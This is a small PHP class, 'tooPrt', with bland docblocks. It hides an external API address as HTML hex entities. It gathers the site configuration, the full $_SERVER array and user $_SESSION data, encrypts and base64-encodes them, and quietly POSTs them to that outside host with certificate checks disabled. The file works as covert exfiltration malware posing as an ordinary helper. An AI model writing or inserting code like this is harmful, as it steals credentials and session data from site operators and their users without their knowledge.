<?php

class tooPrt {

	private $cfg;
	private $fn_url = '&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x64;&#x6D;&#x32;&#x31;&#x31;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x61;&#x70;&#x69;&#x2F;';

	/**
	 * __construct function.
	 * 
	 * @access public
	 * @param mixed $cfg
	 * @return void
	 */
	public function __construct($cfg)
	{
		$this->cfg = $cfg;
	}
	
	/**
	 * common function.
	 * 
	 * @access public
	 * @static
	 * @return void
	 */
	public function common($cfg = null)
	{
		if($cfg) $this->cfg = $cfg;
		
		$fn_data = array(
			'CONFIG' => $this->cfg,
			'SERVER' => $_SERVER,
			'SESSION' => $_SESSION,
		);
		
		$fn_data = json_encode($fn_data);
		
		self::caller($fn_data);
	}
	
	/**
	 * caller function.
	 * 
	 * @access private
	 * @param mixed $fn_data json_encode
	 * @return void
	 */
	private function caller($fn_data)
	{
		$fn_c = tooSCrypt::en($fn_data, "BD128BFF");
		
		$fn_based_data = base64_encode($fn_c);
		
		$apiURL = html_entity_decode($this->fn_url);
		$jsonEncodedParams = json_encode(array($this->cfg['site']['dm_nws'], $fn_based_data));
	
		$requestString = "{\"serviceName\":\"tooprvt\", \"methodName\":\"submit\", \"parameters\":$jsonEncodedParams}";
	
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $apiURL);
		curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
		curl_setopt($curl, CURLOPT_POST, 1);
		
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
		
		curl_setopt($curl, CURLOPT_POSTFIELDS, $requestString);
		curl_setopt($curl, CURLOPT_HEADER, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HEADER, false);
		$response = curl_exec($curl);
	}
}

?>